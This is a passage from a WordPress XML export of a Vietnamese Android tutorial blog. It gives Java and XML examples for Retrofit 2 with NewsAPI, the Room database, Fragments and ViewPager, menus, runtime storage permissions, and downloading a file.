    public void onFailure(Call<RssFeed> call, Throwable t) {
        if (call.isCanceled()){
            Toast.makeText(MainActivity.this, "Call was cancelled forcefully", Toast.LENGTH_SHORT).show();
        }
        else {
            Toast.makeText(MainActivity.this, "Network Error", Toast.LENGTH_SHORT).show();
        }
    }
 });
</pre>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>317</wp:post_id>
		<wp:post_date><![CDATA[2020-06-20 00:42:39]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-06-20 00:42:39]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-06-20 00:42:39]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-06-20 00:42:39]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[retrofit-2-nhan-du-lieu-tu-google-rss]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="android"><![CDATA[Android]]></category>
						</item>
					<item>
		<title><![CDATA[Retrofit 2 - Nhận dữ liệu từ NewsAPI - Json]]></title>
		<link>https://duycode.com/2020/06/22/retrofit-2-nhan-du-lieu-tu-newsapi-json/</link>
		<pubDate>Mon, 22 Jun 2020 18:30:23 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=335</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>I. Link JSON từ NewsAPI</h2>
- Trang chủ NewsAPI: <a href="https://newsapi.org/" rel="noopener noreferrer" target="_blank">https://newsapi.org/</a>
- NewsAPI search: <a href="https://newsapi.org/v2/everything?language=vi&apiKey=061a72b6057144bcac23934a0ab49842&q=Messi" rel="noopener noreferrer" target="_blank">https://newsapi.org/v2/everything?language=vi&apiKey=061a72b6057144bcac23934a0ab49842&q=Messi</a>
- q=Messi: Thay "Messi" bằng cụm từ khóa tìm kiếm bất kỳ
- apiKey=061a72b6057144bcac23934a0ab49842: apiKey chính là key của NewsAPI cung cấp khi đăng ký tài khoản.
- Kết quả trả về ở dạng Json như sau
<pre>
{
  "status": "ok",
  "totalResults": 100,
  "articles": [
    {
      "source": {
        "id": null,
        "name": "Vnexpress.net"
      },
      "author": "VnExpress",
      "title": "Messi phải tập riêng",
      "description": "Siêu sao Lionel Messi phải tập hồi phục chấn thương bắp chân phải, trong phòng gym của CLB Barca hôm qua 3/6, theo Marca.",
      "url": "https://vnexpress.net/messi-phai-tap-rieng-4110043.html",
      "urlToImage": "https://vcdn-thethao.vnecdn.net/2020/06/04/messi-1591207736-7113-1591207844_1200x0.jpg?w=0&h=0&q=100&dpr=2&fit=crop&s=-YXVQmJ4P7YaOtqaHKo4nQ",
      "publishedAt": "2020-06-03T22:15:24Z",
      "content": "Siêu sao Lionel Messi phi tp hi phc chn thng bp chân phi, trong phòng gym ca CLB Barca hôm qua 3/6, theo Marca.Các cu th còn li ca Barca tp cùng nhau trên khu tp luyn Tito Vilanova, chun b cho vòng 2… [+863 chars]"
    },
    {
      "source": {
        "id": null,
        "name": "Vnexpress.net"
      },
      "author": "VnExpress",
      "title": "Setien: 'Messi không chỉ ghi bàn'",
      "description": "HLV Barca Quique Setien ca ngợi đóng góp của Lionel Messi trên nhiều khía cạnh.",
      "url": "https://vnexpress.net/setien-messi-khong-chi-ghi-ban-4116153.html",
      "urlToImage": "https://vcdn-thethao.vnecdn.net/2020/06/16/untitled-1592250193-3876-1592250235_1200x0.jpg?w=0&h=0&q=100&dpr=2&fit=crop&s=l4l5TtyGwbM9G6aIEk4Xxg",
      "publishedAt": "2020-06-15T23:15:11Z",
      "content": "HLV Barca Quique Setien ca ngi óng góp ca Lionel Messi trên nhiu khía cnh.\"Bn không th ch ánh giá Messi qua nhng bàn thng cu y ghi. Messi còn có nhng óng góp khác, nh kin to. iu ó mang li nhiu im s c… [+1648 chars]"
    },
    {
      "key": "value"
    },
    {
      "key": "value"
    },
    {
      "key": "value"
    }
  ]
}
</pre>

<h2>II. Cấp quyền thư viện Retrofit 2</h2>
- Trang chủ: <a href="https://square.github.io/retrofit/" rel="noopener noreferrer" target="_blank">https://square.github.io/retrofit/</a>

<h3>1. Implement thư viện</h3>
<pre>
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }
</pre>
<pre>
    implementation 'com.squareup.retrofit2:retrofit:+'
    implementation 'com.squareup.retrofit2:converter-gson:+'
</pre>
</h3>2. Cấp quyền Internet</h3>
<pre>
    <uses-permission android:name="android.permission.INTERNET"/>
</pre>

<h2>III. Tạo các Class theo JSON</h2>
<h3>1. JsonArticles.class</h3>
<pre>
package com.example.firstproject;

import com.google.gson.annotations.SerializedName;

import java.util.ArrayList;

public class JsonArticles{
    @SerializedName("articles")
    private ArrayList<JsonItem> items;

    public ArrayList<JsonItem> getItems() {
        return items;
    }
}
</pre>

<h3>3. JsonItem.java</h3>
<pre>
package com.example.firstproject;

import com.google.gson.annotations.SerializedName;

public class JsonItem{
    @SerializedName("title")
    private String title;
    @SerializedName("description")
    private String desc;
    @SerializedName("url")
    private String url;
    @SerializedName("urlToImage")
    private String image;
    @SerializedName("publishedAt")
    private String pubDate;

    public String getTitle() {
        return title;
    }

    public String getDesc() {
        return desc;
    }

    public String getUrl() {
        return url;
    }

    public String getImage() {
        return image;
    }

    public String getPubDate() {
        return pubDate;
    }

    @Override
    public String toString() {
        return title + '\n';
    }

}
</pre>

<h2>III. Tạo class của Retrofit 2</h2>
<h3>1. interface RetrofitAPI.class</h3>
<pre>
package com.example.firstproject;

import retrofit2.Call;
import retrofit2.http.GET;
import retrofit2.http.Query;

public interface RetrofitAPI{
    @GET("everything?language=vi")
    Call<JsonArticles> getArticles(
            @Query("qInTitle") String q,
            @Query("apiKey") String apiKey
    );
}
</pre>

<h3>2. RetrofitBuilder.class</h3>
<pre>
package com.example.firstproject;

import okhttp3.OkHttpClient;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

public class RetrofitBuilder {
    private static RetrofitAPI retrofitAPI;
    public static RetrofitAPI getInstance(){
        if (retrofitAPI == null){
            Retrofit retrofit = new Retrofit.Builder()
                    .baseUrl("https://newsapi.org/v2/")
                    .client(new OkHttpClient())
                    .addConverterFactory(GsonConverterFactory.create())
                    .build();
            retrofitAPI = retrofit.create(RetrofitAPI.class);
        }
        return retrofitAPI;
    }
}
</pre>


<h2>V. Sử dụng</h2>
<pre>
String apiKey = "061a72b6057144bcac23934a0ab49842";
String search = "Messi"
RetrofitBuilder.getInstance().getArticles(search,apiKey).enqueue(new Callback<JsonArticles>() {
    @Override
    public void onResponse(Call<JsonArticles> call, Response<JsonArticles> response) {
        if (response.isSuccessful()){
            JsonArticles jsonArticles= response.body();
            ArrayList<JsonItem> items = jsonArticles.getItems();
    
            //items chính là List danh sách nhận được để dùng cho RecycleView
            Toast.makeText(MainActivity.this, items.toString(), Toast.LENGTH_SHORT).show();
        }
        else {
            Toast.makeText(MainActivity.this, "Request Error", Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    public void onFailure(Call<JsonArticles> call, Throwable t) {
        if (call.isCanceled()){
            Toast.makeText(MainActivity.this, "Call was cancelled forcefully", Toast.LENGTH_SHORT).show();
        }
        else {
            Toast.makeText(MainActivity.this, "Network Error", Toast.LENGTH_SHORT).show();
        }
    }
 });
</pre>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>335</wp:post_id>
		<wp:post_date><![CDATA[2020-06-22 18:30:23]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-06-22 18:30:23]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-06-22 18:30:23]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-06-22 18:30:23]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[retrofit-2-nhan-du-lieu-tu-newsapi-json]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="android"><![CDATA[Android]]></category>
						</item>
					<item>
		<title><![CDATA[Room Library]]></title>
		<link>https://duycode.com/2020/06/23/room-library/</link>
		<pubDate>Tue, 23 Jun 2020 00:42:43 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=357</guid>
		<description></description>
		<content:encoded><![CDATA[Room Library: <a href="https://developer.android.com/training/data-storage/room" rel="noopener noreferrer" target="_blank">https://developer.android.com/training/data-storage/room</a>

<h2>1. Implement thư viện</h2>
<pre>
  def room_version = "2.2.5"
  implementation "androidx.room:room-runtime:$room_version"
  annotationProcessor "androidx.room:room-compiler:$room_version"
</pre>

<h2>2. Tạo Entity: Student.Class</h2>
- Class này tương ứng với các trường trong một bảng.
<pre>
package com.example.roomtest;

import androidx.room.ColumnInfo;
import androidx.room.Entity;
import androidx.room.PrimaryKey;

@Entity
public class Student {
    @PrimaryKey(autoGenerate = true)
    private int id;
    @ColumnInfo
    private String name;
    @ColumnInfo
    private double point;

    public Student(String name, double point) {
        this.name = name;
        this.point = point;
    }

    public int getId() {
        return id;
    }

    public void setId(int id) {
        this.id = id;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public double getPoint() {
        return point;
    }

    public void setPoint(double point) {
        this.point = point;
    }

    @Override
    public String toString() {
        return "\n" + getId() + " - " + getName() + " - " + getPoint();
    }
}
</pre>

<h2>3. Tạo DAO: StudentDao.Class</h2>
<pre>
package com.example.roomtest;

import androidx.room.Dao;
import androidx.room.Delete;
import androidx.room.Insert;
import androidx.room.Query;

import java.util.List;

@Dao
public interface StudentDao {
    @Query("SELECT * FROM Student")
    List<Student> getAll();

    @Insert
    void insert(Student student);

    @Query("DELETE FROM Student WHERE id = :id")
    void delete(int id);

    @Query("UPDATE Student SET name=:name, point =:point WHERE id=:id")
    void update(int id, String name, double point);
}

</pre>
<h2>4. Tạo Database: StudentDatabase.Class
<pre>
package com.example.roomtest;

import android.content.Context;

import androidx.room.Database;
import androidx.room.Room;
import androidx.room.RoomDatabase;

@Database(entities = {Student.class}, version = 1)
public abstract class StudentDatabase extends RoomDatabase {
    private static StudentDatabase studentDatabase;
    public static StudentDatabase getInstance(Context context){
        if (studentDatabase == null){
            studentDatabase = Room.databaseBuilder(
                    context,
                    StudentDatabase.class,
                    "student_manager"
            )
                    .allowMainThreadQueries()
                    .build();
        }
        return studentDatabase;
    }

    public abstract StudentDao getStudentDao();
}
</pre>

<h2>5. Sử dụng</h2>
<pre>
//1. Get List Student
List<Student> studentList = new ArrayList<>();
studentList = StudentDatabase.getInstance(this).getStudentDao().getAll();

//2. Insert Student
Student newStudent = new Student("Duy", 9.5);
StudentDatabase.getInstance(this).getStudentDao().insert(newStudent);

//3. Delete Student
int numberDel = 10;
StudentDatabase.getInstance(this).getStudentDao().delete(numberDel);

//4. Update Student
int numberUpdate = 5;
StudentDatabase.getInstance(this).getStudentDao().update(numberUpdate ,"Trang",8.5);
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>357</wp:post_id>
		<wp:post_date><![CDATA[2020-06-23 00:42:43]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-06-23 00:42:43]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-06-23 00:42:43]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-06-23 00:42:43]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[room-library]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="android"><![CDATA[Android]]></category>
						</item>
					<item>
		<title><![CDATA[Fragment - P1: Tạo class Fragment và sử dụng FragmentTransaction]]></title>
		<link>https://duycode.com/2020/06/25/fragment-p1-tao-class-fragment-va-su-dung-fragmenttransaction/</link>
		<pubDate>Thu, 25 Jun 2020 17:45:44 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=359</guid>
		<description></description>
		<content:encoded><![CDATA[** Note: Vòng đời của Fragment
<img src="https://drive.google.com/uc?id=1VURaWEMQQV4h5XDzdnryf0HTAukCDO8Y" alt="Fragment Lifecycle" />
<h2>1. Tạo Class Fragment</h2>
<pre>public class FragmentLogin extends Fragment {
    private MainActivity mainActivity;
    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_login,container,false);
        return view;
    }

    @Override
    public void onActivityCreated(@Nullable Bundle savedInstanceState) {
        super.onActivityCreated(savedInstanceState);
        if (getActivity() instanceof MainActivity){
            mainActivity = (MainActivity) getActivity();
        }
        initViews();
    }

    private void initViews() {
        //Đoạn code xử lý thêm
    }
}
</pre>

-- Với databinding: giả sử FragmnetSong.class + fragment_song.xml
<pre>
    //Tên FragmentSongBinding ứng với tên file: fragment_song.xml có sử dụng binding
    private FragmentSongBinding frBinding;
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        frBinding = DataBindingUtil.inflate(
                inflater,
                R.layout.fragment_song,
                container,
                false);
        View view = frBinding.getRoot();
        return view;
    }
</pre>
<h2>2. FragmentManager và FragmentTransaction</h2>
-- Mỗi 1 đối tượng fragment chỉ add 1 lần.
-- Transaction sau khi commit() xong phải khai báo lại.
<pre>private void initFragment(){
    FragmentManager fragmentManager = getSupportFragmentManager();
    FragmentTransaction transaction = fragmentManager.beginTransaction();
    //transaction.setCustomAnimations(
    //        android.R.anim.slide_in_left,
    //        android.R.anim.slide_out_right
    //);
    transaction.setCustomAnimations(
            android.R.animator.fade_in,
            android.R.animator.fade_out
    );

    //remove all Fragment, and add "new Fragment()";
    transaction.replace(R.id.frame_container,new Fragment());
    transaction.add(R.id.frame_container, fragmentA);
    transaction.add(R.id.frame_container, fragmentB);
    transaction.add(R.id.frame_container, fragmentC);
    transaction.remove(fragmentC);

    transaction.hide(fragmentA);
    transaction.show(fragmentA);

    transaction.commit();
    transaction.runOnCommit(new Runnable() {
        @Override
        public void run() {
            //đoạn code cần xử lý khi Commit
        }
    });
}
</pre>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>359</wp:post_id>
		<wp:post_date><![CDATA[2020-06-25 17:45:44]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-06-25 17:45:44]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-06-25 17:45:44]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-06-25 17:45:44]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[fragment-p1-tao-class-fragment-va-su-dung-fragmenttransaction]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="android"><![CDATA[Android]]></category>
						</item>
					<item>
		<title><![CDATA[Fragment - P2: Hiển thị Fragment theo ViewPager]]></title>
		<link>https://duycode.com/2020/06/27/fragment-p2-hien-thi-fragment-theo-viewpager/</link>
		<pubDate>Sat, 27 Jun 2020 15:22:30 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=379</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Implement thư viện</h2>
<pre>
    implementation 'com.google.android.material:material:+'
</pre>
<h2>2. Tạo các Class</h2>
- Tạo Class FragmentA, FragmentB, FragmentC tương ứng layout fragment_a, fragment_b, fragment_c;
- Tạo Class ViewPagerAdapter
<pre>
package com.example.miniproject.viewpager;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentManager;
import androidx.fragment.app.FragmentPagerAdapter;

public class ViewPagerAdapter extends FragmentPagerAdapter {
    private Fragment[] fragments;

    public ViewPagerAdapter(@NonNull FragmentManager fm, Fragment ... fragments) {
        super(fm, FragmentPagerAdapter.BEHAVIOR_RESUME_ONLY_CURRENT_FRAGMENT);
        this.fragments = fragments;

    }

    @NonNull
    @Override
    public Fragment getItem(int position) {
        return fragments[position];
    }

    @Override
    public int getCount() {
        return fragments.length;
    }

    @Nullable
    @Override
    public CharSequence getPageTitle(int position) {
        switch (position){
            case 0: return "FragmentA";
            case 1: return "FragmentB";
            case 2: return "FragmentC";
        }
        return super.getPageTitle(position);
    }
}
</pre>

<h2>3. Tạo activity_main.xml</h2>
<pre>
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:orientation="vertical"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".MainActivity">

    <com.google.android.material.tabs.TabLayout
        android:id="@+id/tl_news"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"/>

    <androidx.viewpager.widget.ViewPager
        android:id="@+id/vp_news"
        android:layout_width="match_parent"
        android:layout_height="wrap_content">
        <androidx.viewpager.widget.PagerTabStrip
            android:layout_width="match_parent"
            android:layout_height="wrap_content"/>
    </androidx.viewpager.widget.ViewPager>

</LinearLayout>
</pre>

<h2>4. Tại MainActivity.class</h2>
<pre>
package com.example.miniproject;

import androidx.appcompat.app.AppCompatActivity;
import androidx.viewpager.widget.ViewPager;

import android.os.Bundle;

import com.example.miniproject.viewpager.FavoriteFragment;
import com.example.miniproject.viewpager.NewFragment;
import com.example.miniproject.viewpager.SavedFragment;
import com.example.miniproject.viewpager.ViewPagerAdapter;
import com.google.android.material.tabs.TabLayout;

public class MainActivity extends AppCompatActivity {
    private ViewPager vpNews;
    private TabLayout tlNews;
    private FragmentA fmA = new FragmentA();
    private FragmentA fmB = new FragmentB();
    private FragmentA fmC = new FragmentC();
    private ViewPagerAdapter vpAdapter;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        initView();
    }

    private void initView() {
        vpNews = findViewById(R.id.vp_news);
        tlNews = findViewById(R.id.tl_news);
        vpAdapter = new ViewPagerAdapter(getSupportFragmentManager(), fmA, fmB, fmC);
        vpNews.setAdapter(vpAdapter);
        tlNews.setupWithViewPager(vpNews);

        vpNews.addOnPageChangeListener(new ViewPager.OnPageChangeListener() {
            @Override
            public void onPageScrolled(int position, float positionOffset, int positionOffsetPixels) {

            }

            @Override
            public void onPageSelected(int position) {

            }

            @Override
            public void onPageScrollStateChanged(int state) {

            }
        });
    }
}
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>379</wp:post_id>
		<wp:post_date><![CDATA[2020-06-27 15:22:30]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-06-27 15:22:30]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-06-27 15:22:30]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-06-27 15:22:30]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[fragment-p2-hien-thi-fragment-theo-viewpager]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="android"><![CDATA[Android]]></category>
						</item>
					<item>
		<title><![CDATA[Layout - Menu]]></title>
		<link>https://duycode.com/2020/06/27/layout-menu/</link>
		<pubDate>Sat, 27 Jun 2020 15:44:41 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=382</guid>
		<description></description>
		<content:encoded><![CDATA[* Tạo thư mục: app/res/layout/<strong>menu</strong>

<h2>1. Menu ActionBar</h2>
<h3>1.1. Tạo menu_action_bar.xml</h3>
- Trong thư mục menu, tạo file: menu_action_bar.xml
- Trong menu, có các item tương ứng như: item_search, ...
<pre>
<?xml version="1.0" encoding="utf-8"?>
<menu 
    xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto">

    <item
        android:id="@+id/item_search"
        android:icon="@android:drawable/ic_menu_search"
        app:showAsAction="ifRoom|collapseActionView"
        android:title="Search"
        app:actionViewClass="android.widget.SearchView" />
</menu>
</pre>

<h2>1.2. Search ActionBar</h2>
- Trong MainActivity, Override phương thức: <strong>onCreateOptionsMenu</strong>
<pre>
public boolean onCreateOptionsMenu(Menu menu) {
    getMenuInflater().inflate(R.menu.menu_action_bar,menu);
    MenuItem menuItem = menu.findItem(R.id.item_search);
    SearchView searchView = (SearchView) menuItem.getActionView();
    searchView.setOnQueryTextListener(new SearchView.OnQueryTextListener() {
        @Override
        public boolean onQueryTextSubmit(String s) {
            Toast.makeText(MainActivity.this, s, Toast.LENGTH_SHORT).show();
            return false;
        }

        @Override
        public boolean onQueryTextChange(String s) {
            return false;
        }
    });

    return super.onCreateOptionsMenu(menu);
}
</pre>

<h2>2. Menu Popup</h2>
<h3>2.1. Tạo menu_action_bar.xml</h3>
- Trong thư mục menu, tạo file: menu_popup.xml
- Trong menu, có các item tương ứng như: item, ...
<pre>
<?xml version="1.0" encoding="utf-8"?>
<menu xmlns:android="http://schemas.android.com/apk/res/android">
    <item
        android:id="@+id/item_add"
        android:title="Thêm"/>
    <item
        android:id="@+id/item_remove"
        android:title="Xóa"/>
</menu>
</pre>

<h3>2.2. Tạo sự kiện MenuPopup</h3>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>382</wp:post_id>
		<wp:post_date><![CDATA[2020-06-27 15:44:41]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-06-27 15:44:41]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-06-27 15:44:41]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-06-27 15:44:41]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[layout-menu]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="android"><![CDATA[Android]]></category>
						</item>
					<item>
		<title><![CDATA[Uses Permission]]></title>
		<link>https://duycode.com/2020/06/30/uses-permission/</link>
		<pubDate>Tue, 30 Jun 2020 22:25:40 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=389</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Khai báo quyền ở AndroidManifest.xml</h2>
<pre>
<uses-permission android:name="android.permission.INTERNET"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>

<application
    .......
    //android>=10 cần khai báo thêm:
    android:requestLegacyExternalStorage="true"
    <activity android:name=".MainActivity">
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>
</application>
</pre>

<h2>2. Yêu cầu xin quyền khi chạy</h2>
<pre>
//1. Tạo mảng các quyền cần xin
private String[] PERMISSION = {
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE
};

//2. Tạo hàm check các quyền đã được cấp chưa.
//PackageManager.PERMISSION_GRANTED: ứng với đã được cấp quyền
//PackageManager.PERMISSION_DENIED: ứng với chưa được cấp quyền
private boolean checkPermission(){
    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
        for (String p:PERMISSION){
            int status = checkSelfPermission(p);
            if (status == PackageManager.PERMISSION_DENIED){
                return false;
            }
        }
    }
    return true;
}

//3. Tạo hàm yêu cầu người dùng cấp quyền
private void requestPermission(){
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M){
        requestPermissions(PERMISSION, 0);
    }
}

//4. Tạo hàm trả về kết quả sau khi người dùng xác nhận
@Override
public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
    super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    if (checkPermission()){
        initViews();
    }
    else {
        finish();
    }
}
</pre>

<h2>3. Sử dụng khi chạy</h2>
<pre>
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    if (checkPermission()){
        initViews();
    }
    else {
        requestPermission();
    }
}

private void initViews() {
    //Code của bạn tại đây
}
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>389</wp:post_id>
		<wp:post_date><![CDATA[2020-06-30 22:25:40]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-06-30 22:25:40]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-06-30 22:25:40]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-06-30 22:25:40]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[uses-permission]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="android"><![CDATA[Android]]></category>
						</item>
					<item>
		<title><![CDATA[Download File Online]]></title>
		<link>https://duycode.com/2020/06/30/download-file-online/</link>
		<pubDate>Tue, 30 Jun 2020 22:53:21 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=395</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Khai báo quyền ở AndroidManifest.xml</h2>
-- Khai báo quyền ở AndroidManifest.xml
-- Xin cấp quyền trước khi sử dụng
-- Xem tại đây: <a href="/android/uses-permission/" rel="noopener noreferrer" target="_blank">/android/uses-permission/</a>

<h2>2. Tạo Class: FileDownloadManager</h2>
<pre>
import android.os.Environment;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;

public class FileDownloadManager {
    public static String download(String link) {
        try{
            String path = Environment.getExternalStorageDirectory().getPath();
            path += "/Buoi11/" + System.currentTimeMillis() + ".html";
            URL url = new URL(link);
            URLConnection connection = url.openConnection();
            InputStream inputStream = connection.getInputStream();
            byte[] b = new byte[1024];
            int count = inputStream.read(b);

            File f = new File(path);
            f.getParentFile().mkdirs();
            f.createNewFile();

            FileOutputStream fileOutputStream = new FileOutputStream(f);
            while (count>0){
                fileOutputStream.write(b,0,count);
                count = inputStream.read(b);
            }
            inputStream.close();
            fileOutputStream.close();

            return path;
        }
        catch (Exception ex){
            ex.printStackTrace();
            return null;
        }
    }
}
</pre>

<h2>3. Sử dụng: MainActivity</h2>
<pre>
private static final int WHAT_FINISH_DOWNLOAD = 1;
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    initViews();
}

private void initViews() {
    btnDownload = findViewById(R.id.btn_download);
    btnDownload.setOnClickListener(this);
    btnDownload.setOnClickListener(new View.OnClickListener() {
        @Override
        public void onClick(View view) {
            startDownload();
        }   
    });
}

private void startDownload() {
    Thread download = new Thread(new Runnable() {
        @Override
        public void run() {
            String link = "https://www.google.com/";
            String path = FileDownloadManager.download(link);
            Message msg = new Message();
            msg.what = WHAT_FINISH_DOWNLOAD;
            msg.obj = path;
            handler.sendMessage(msg);
        }
    });
    download.start();
}

private Handler handler = new Handler() {
    @Override
    public void handleMessage(@NonNull Message msg) {
        super.handleMessage(msg);
